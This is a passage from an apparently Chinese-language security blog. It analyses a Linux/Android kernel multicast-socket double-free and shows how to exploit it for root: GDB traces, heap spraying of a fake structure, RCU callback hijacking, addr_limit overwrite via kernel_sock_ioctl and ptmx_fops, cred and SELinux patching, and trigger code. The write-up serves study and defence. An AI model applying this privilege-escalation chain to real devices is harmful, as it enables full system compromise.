0 &#125;, imr_ifindex = 2 &#125;, sfmode = 0, sflist = 0x0, rcu = &#123; next = 0x0, func = 0x0 &#125;&#125; 紧接着在ip_mc_drop_socket()函数处下断点,让程序继续运行，当poc程序第一次调用关闭socket函数close时，程序会在ip_mc_drop_socket函数处断下，此时我们通过p * iml指令查看一下iml成员中的值，可以看到和我们最开始的一致，然后让程序再次跑起来123456789101112131415161718192021222324252627282930(gdb) break ip_mc_drop_socketBreakpoint 2 at 0xc02de8c8: file net/ipv4/igmp.c, line 2287.(gdb) cContinuing.Breakpoint 2, ip_mc_drop_socket (sk=0xd3864940) at net/ipv4/igmp.c:22872287 &#123;(gdb) n2292 if (inet-&gt;mc_list == NULL)2295 rtnl_lock();2305 atomic_sub(sizeof(*iml), &amp;sk-&gt;sk_omem_alloc);2296 while ((iml = rtnl_dereference(inet-&gt;mc_list)) != NULL) &#123;(gdb) p *iml$3 = &#123; next_rcu = 0x0, multi = &#123; imr_multiaddr = &#123; s_addr = 16843240 &#125;, imr_address = &#123; s_addr = 0 &#125;, imr_ifindex = 2 &#125;, sfmode = 0, sflist = 0x0, rcu = &#123; next = 0x0, func = 0x0 &#125;&#125; 第二次在ip_mc_drop_socket函数断下的时候，说明程序执行到了第二次调用释放socket函数的位置，此时再次查看一下该结构体内存中的数据，可以看到因为第一次释放套接字的时候已经把最开始申请的内存释放了,并且已经成功喷射成了我们伪造的数据，0xc6d2dd80已经指向的是我们喷射的数据，因为0xb6efb000是我们在Exp中使用mmap映射出来的地址，所以sflist指针指向的是我们用户态随意控制的数据12345678910111213141516171819202122232425262728293031(gdb) cContinuing.Breakpoint 2, ip_mc_drop_socket (sk=0xd3865240) at net/ipv4/igmp.c:22872287 &#123;(gdb) n2292 if (inet-&gt;mc_list == NULL)2295 rtnl_lock();2305 atomic_sub(sizeof(*iml), &amp;sk-&gt;sk_omem_alloc);2296 while ((iml = rtnl_dereference(inet-&gt;mc_list)) != NULL) &#123;2299 inet-&gt;mc_list = iml-&gt;next_rcu;(gdb) p iml$4 = (struct ip_mc_socklist *) 0xc6d2dd80(gdb) p *iml$5 = &#123; next_rcu = 0x0, multi = &#123; imr_multiaddr = &#123; s_addr = 0 &#125;, imr_address = &#123; s_addr = 0 &#125;, imr_ifindex = 123456 &#125;, sfmode = 0, sflist = 0xb6efb000, rcu = &#123; next = 0x0, func = 0x0 &#125;&#125; 查看一下sflist指针指向的内存数据，然后对照下内核源码中的该结构体，0xeeeeeeee正好就是函数指针，并且在ip_mc_leave_src函数中存在一个kfree_rcu函数可以把sflist指向的psf变量中的callback_head链入到rcu回调函数链表中，我们只要精心构造一下喷射数据就可以成功执行到该kfree_rcu处 (gdb) x/10x 0xb6efb000 0xb6efb000: 0x00000000 0x00000000 0x00000000 0xeeeeeeee 0xb6efb010: 0x00000000 0x00000000 0x00000000 0x00000000 0xb6efb020: 0x00000000 0x00000000 12345678910111213141516171819202122232425262728293031ip_mc_leave_src (sk=0xd3865240, iml=0xc6d2dd80, in_dev=0x0) at net/ipv4/igmp.c:18341834 &#123;(gdb) s1835 struct ip_sf_socklist *psf = rtnl_dereference(iml-&gt;sflist);(gdb) s1834 &#123;1838 if (psf == NULL) &#123;1844 iml-&gt;sfmode, psf-&gt;sl_count, psf-&gt;sl_addr, 0);1843 err = ip_mc_del_src(in_dev, &amp;iml-&gt;multi.imr_multiaddr.s_addr,1845 RCU_INIT_POINTER(iml-&gt;sflist, NULL);1847 atomic_sub(IP_SFLSIZE(psf-&gt;sl_max), &amp;sk-&gt;sk_omem_alloc);1843 err = ip_mc_del_src(in_dev, &amp;iml-&gt;multi.imr_multiaddr.s_addr,1847 atomic_sub(IP_SFLSIZE(psf-&gt;sl_max), &amp;sk-&gt;sk_omem_alloc);(gdb) p psf$6 = (struct ip_sf_socklist *) 0xb6efb000(gdb) p *psf$7 = &#123; sl_max = 0, sl_count = 0, rcu = &#123; next = 0x0, func = 0xeeeeeeee &#125;, sl_addr = 0xb6efb010&#125;1848 kfree_rcu(psf, rcu);(gdb) x/10x 0xb6efb0000xb6efb000: 0x00000000 0x00000000 0x00000000 0x000000080xb6efb010: 0x00000000 0x00000000 0x00000000 0x000000000xb6efb020: 0x00000000 0x00000000 注意:因为kfree_rcu函数会把我们设置的rcu-&gt;func的值修改为别的数据，所以我们调试的时候手动把用户态地址0xb6efb00c中的值修改回0xeeeeeeee(写Exp的时候可以开一个线程循环对其修改即可)当设置好ruc回调函数后等着内核调用就好了,这样就顺利的控制了内核态的PC指针,并且参数1是可控。1234567891011121314static inline bool __rcu_reclaim(char *rn, struct rcu_head *head)&#123; unsigned long offset = (unsigned long)head-&gt;func; if (__is_kfree_rcu_offset(offset)) &#123; RCU_TRACE(trace_rcu_invoke_kfree_callback(rn, head, offset)); kfree((void *)head - offset); return 1; &#125; else &#123; RCU_TRACE(trace_rcu_invoke_callback(rn, head)); head-&gt;func(head); /*控制执行流*/ return 0; &#125;&#125; 需要喷射的结构体1234567struct ip_mc_socklist &#123; struct ip_mc_socklist __rcu *next_rcu; struct ip_mreqn multi; unsigned int sfmode; /* MCAST_&#123;INCLUDE,EXCLUDE&#125; */ struct ip_sf_socklist __rcu *sflist; struct rcu_head rcu;&#125;; 用户态伪造结构体123456struct ip_sf_socklist &#123; unsigned int sl_max; unsigned int sl_count; struct rcu_head *rcu; __be32 sl_addr[0];&#125;; Root提权现在我们已经能够成功劫持内核执行流程了,接下来要做的就是如何劫持内核执行来达到内核提权的效果。1.修改exp进程的addr_limit字段,实现内核任意访问虽然成功劫持了内核的执行,但是离我们的目标还差一步,因为现在的内核默认是开启了PXN(Privileged execute-never)保护的,所以我们不能直接让内核去执行我们用户态的权限提升shellcode,我们需要实现对内核进行任意读写,通过任意读写来完成权限提升。 首先我们来看一个结构体123456789101112131415struct thread_info &#123; struct pcb_struct pcb; /* palcode state */ struct task_struct *task; /* main task structure */ unsigned int flags; /* low level flags */ unsigned int ieee_state; /* see fpu.h */ struct exec_domain *exec_domain; /* execution domain */ mm_segment_t addr_limit; /* thread address space */ unsigned cpu; /* current CPU */ int preempt_count; /* 0 =&gt; preemptable, &lt;0 =&gt; BUG */ unsigned int status; /* thread-synchronous flags */ int bpt_nsaved; unsigned long bpt_addr[2]; /* breakpoint handling */ unsigned int bpt_insn[2]; struct restart_block restart_block;&#125;; 系统中的每一个线程都会分配自己的堆栈,其底部存在一个thread_info结构体,该结构体记录着当前线程的一些属性,结构体中的addr_limit元素表示当前线程可访问的地址空间,就是因为该元素所以正常情况下我们用户态程序不能访问内核态内存,但是如果我们把该字段的内容改为-1(0xffffffffffffffff),那么对应的线程就能访问任意内核地址了。 但是我们如何去修改addr_limit呢? 泄漏线程sp,计算thread_info地址,索引修改addr_limit 1234/* 通过泄漏的sp计算出thread_info的地址 THREAD_SIZE==8192 */ static inline struct thread_info *current_thread_info(void) &#123; return (struct thread_info *)(current_stack_pointer &amp; ~(THREAD_SIZE - 1)); &#125; 利用内核中本来就存在的对addr_limit值进行修改的函数,不过一般这类函数都是成对出现,先修改为新值,再恢复为原始值,我们需要想办法绕过恢复操作(例:kernel_sock_ioctl) 123456789int kernel_sock_ioctl(struct socket *sock, int cmd, unsigned long arg)&#123; mm_segment_t oldfs = get_fs(); int err; set_fs(KERNEL_DS); /* 修改addr_limit为0xffffffffffffffff*/---- err = sock-&gt;ops-&gt;ioctl(sock, cmd, arg); /* 参数1可控函数指针 直接跳转到return err处执行*/| set_fs(oldfs); /* 恢复旧的addr_limit 跳过该条指令的执行*/---&gt; return err;&#125; 在内核函数中存在一个kernel_sock_ioctl函数,该函数存在一个函数指针调用,而这个函数指针又正由参数1所控制,我们就可以在执行完set_fs(KERNEL_DS)函数完后,如果参数1可控,通过控制的函数指针,直接跳转到函数末尾处,这样就绕过了set_fs(oldfs)恢复addr_limit的操作。这里需要注意的是,我们不能在最开始通过触发漏洞去劫持内核执行流程时调用kernel_sock_ioctl函数修改addr_limit,因为这样调用修改的不是我们exp线程的thread_info中的addr_info,只有exp线程调用kernel_sock_ioctl函数修改的才是exp线程的thread_info中的addr_info成员,但是kernel_sock_ioctl函数用户态程序是不能直接调用的,那么如何实现让用户态调用该函数呢?我们知道在linux内核中有许多file_operations结构体类型的全局符号,这类结构体有个特点就是其成员是一组函数指针,每个打开的文件(在内部由一个file结构体表示)都会和一组函数指针关联(通过包含指向一个file_operation结构的f_op字段),这组函数指针用来完成一些用户层函数的功能,用户层可以调用对应的用户层API来触发这些函数指针,我们可以查找一个file_operation结构体变量,把它的某个函数指针指向kernel_sock_ioctl函数,再去调用这个函数指针对应的应用层API，这样的话实际调用的其实是kernel_sock_ioctl函数。合适的函数指针需要满足以下条件: 该函数指针可以被用户层触发调用。 函数指针的参数1可以被我们伪造成想要的结构体。 查找内核源码发现全局符号ptmx_fops中的check_flags函数指针比较合适。我们可以通过/proc/kallsyms文件来获取我们需要的符号地址(ptmx_fops-&gt;check_flags,kernel_sock_ioctl),同时还需要在内核中找到一条能完成任意地址写的ROP链,常用的查找工具有ROPgadget,在触发漏洞控制内核执行时调用这条ROP链,把kernel_sock_ioctl函数地址写入到ptmx_fops-&gt;check_flags函数指针中,修改完毕后让exp线程去打开/dev/ptmx文件,使用fcntl(fd, F_SETFL, jopdata)去触发kernel_sock_ioctl函数,jopdata为我们控制的参数1,可以使用mmap来映射出一片地址,伪造一个socket结构体来控制内核函数kernel_sock_ioctl的跳转位置。这样就轻松修改了exp的addr_limit元素,exp进程就能轻易地对内核进行任意访问了。 2.封装pipe函数,实现内核任意读写,获取exp进程的task_struct结构体,通过task_struct结构体获取该进程的cred结构体 因为exp进程已经可以对内核态任意访问,我们就可以直接在用户态使用pipe对内核进行任意读写,现在我们需要找到exp进程的task_struct结构体,然后根据task_struct结构体去查找cred结构体。 查找task_struct结构体有两种方法。 在线程的thread_info中就存在task_struct结构体,可以通过泄漏sp,然后计算出当前线程的task_struct,不过不适合当前这个漏洞 通过inti进程的task_struct结构体的特征码,暴力搜索。根据/proc/iomem文件获取内存分布,算出init进程task_struct可能存在的区间,找到init进程的task_struct后通过结构体内部链表进行遍历exp进程的task_struct结构体 3.修改cred结构体中的关键字段(uid,gid….)切换SELinux context并关闭SELinux,实现权限提升 通过找到exp的task_struct索引cred结构体,对cred结构体中的几个关键的字段进行修改:1234567891011121314151617181920212223242526272829303132333435363738struct cred &#123; atomic_t usage;#ifdef CONFIG_DEBUG_CREDENTIALS atomic_t subscribers; /* number of processes subscribed */ void *put_addr; unsigned magic;#define CRED_MAGIC 0x43736564#define CRED_MAGIC_DEAD 0x44656144#endif kuid_t uid; /* real UID of the task */ kgid_t gid; /* real GID of the task */ kuid_t suid; /* saved UID of the task */ kgid_t sgid; /* saved GID of the task */ kuid_t euid; /* effective UID of the task */ kgid_t egid; /* effective GID of the task */ kuid_t fsuid; /* UID for VFS ops */ kgid_t fsgid; /* GID for VFS ops */ unsigned securebits; /* SUID-less security management */ kernel_cap_t cap_inheritable; /* caps our children can inherit */ kernel_cap_t cap_permitted; /* caps we're permitted */ kernel_cap_t cap_effective; /* caps we can actually use */ kernel_cap_t cap_bset; /* capability bounding set */#ifdef CONFIG_KEYS unsigned char jit_keyring; /* default keyring to attach requested * keys to */ struct key __rcu *session_keyring; /* keyring inherited over fork */ struct key *process_keyring; /* keyring private to this process */ struct key *thread_keyring; /* keyring private to this thread */ struct key *request_key_auth; /* assumed request_key authority */#endif#ifdef CONFIG_SECURITY void *security; /* subjective LSM security */ /* &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; selinux context &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; task_security_struct */#endif struct user_struct *user; /* real user ID subscription */ struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */ struct group_info *group_info; /* supplementary groups for euid/fsgid */ struct rcu_head rcu; /* RCU deletion hook */&#125;; 进程uid,gid相关的字段改为0(root对应的uid,gid) 12345678cred.uid = 0;cred.gid = 0;cred.suid = 0;cred.sgid = 0;cred.euid = 0;cred.egid = 0;cred.fsuid = 0;cred.fsgid = 0; 进程capability相关的字段改为0xffffffffffffffff(表示全部拥有),每个进程有三个和能力相关的位图:inheritable(I),permitted(P),effective(E)可以通过cat /proc/PID/status来查看进程所拥有的能力。 12345678cred.cap_inheritable.cap[0] = -1; /* cap_inheritable:表示被当前进程执行的程序能够继承的能力 */cred.cap_inheritable.cap[1] = -1;cred.cap_permitted.cap[0] = -1; /* cap_permitted:表示进程能够使用的能力*/cred.cap_permitted.cap[1] = -1;cred.cap_effective.cap[0] = -1; /* cap_effective:表示进程实际拥有的能力,当进程要进行某个特权操作时,内核会检查cap_effective对应位是否有效,[权限列表](http://man7.org/linux/man-pages/man7/capabilities.7.html)*/cred.cap_effective.cap[1] = -1;cred.cap_bset.cap[0] = -1;cred.cap_bset.cap[1] = -1; cred结构体中的security成员指向task_security_struct结构体,编译条件CONFIG_SECURITY,提权时需要把该结构体中的osid,sid修改为init进程对应的soid,sid这样的话exp进程的selinux context就切换成了init对应的selinux context了 12345678struct task_security_struct &#123; u32 osid; /* SID prior to last execve */ u32 sid; /* current SID */ u32 exec_sid; /* exec SID */ u32 create_sid; /* fscreate SID */ u32 keycreate_sid; /* keycreate SID */ u32 sockcreate_sid; /* fscreate SID */&#125;; 触发模型:12345678910111213141516setsockopt(parent_socket, 0x0, MCAST_JOIN_GROUP, &amp;group, sizeof(group)); //申请内存if (listen(parent_socket, 2))&#123; perror(\"error: \\n\"); exit(1);&#125;if(1)&#123; socklen_t len = 0; child_sockfd = accept(parent_socket,(sockaddr*)&amp;client,&amp;len); //创建子套接字,并和父套接字共用同一块内存 if (child_sockfd == -1)&#123; perror(\"error: \\n\"); return 0; &#125; close(child_sockfd); //关闭子套接字,第一次释放&#125;sleep(4);close(parent_socket); //关闭父套接字,第二次释放 总结1.在使用GDB调试时使用set print pretty on选项,查看结构体的时候会更加的直观。2.官方说漏洞属于DoubleFree漏洞,但是我们利用时使用的却是UAF常用利用方法。 通过喷射占位结构体,然后使用喷射结构体中的某个函数指针对执行流进行控制 把Double Free漏洞转换为Use After Free漏洞 3.在文中有些地方表述的还不是太清楚,还需要通过多写文章进行练习表达能力","categories":[{"name":"Vulnerability","slug":"Vulnerability","permalink":"http://github.com/categories/Vulnerability/"}],"tags":[{"name":"Android_Kernel","slug":"Android-Kernel","permalink":"http://github.com/tags/Android-Kernel/"}]},{"title":"@Let_go","slug":"Let-go","date":"2017-03-25T15:26:24.000Z","updated":"2018-08-26T10:38:44.510Z","comments":true,"path":"2017/03/25/Let-go/","link":"","permalink":"http://github.com/2017/03/25/Let-go/","excerpt":"","text":"@Let_go 你好,欢迎来到我的个人技术博客.https://pandao.github.io/editor.md/index.html [markdown在线编辑]https://ijiaober.github.io/2014/08/02/hexo/hexo-index [hexo使用攻略]https://linlif.github.io/2017/05/27/Hexo%E4%BD%BF%E7%94%A8%E6%94%BB%E7%95%A5-%E6%B7%BB%E5%8A%A0%E5%88%86%E7%B1%BB%E5%8F%8A%E6%A0%87%E7%AD%BE/ [源文章中的head部分添加]","categories":[{"name":"Let_go","slug":"Let-go","permalink":"http://github.com/categories/Let-go/"}],"tags":[{"name":"Let1","slug":"Let1","permalink":"http://github.com/tags/Let1/"},{"name":"Let2","slug":"Let2","permalink":"http://github.com/tags/Let2/"},{"name":"Let3","slug":"Let3","permalink":"http://github.com/tags/Let3/"}]}]}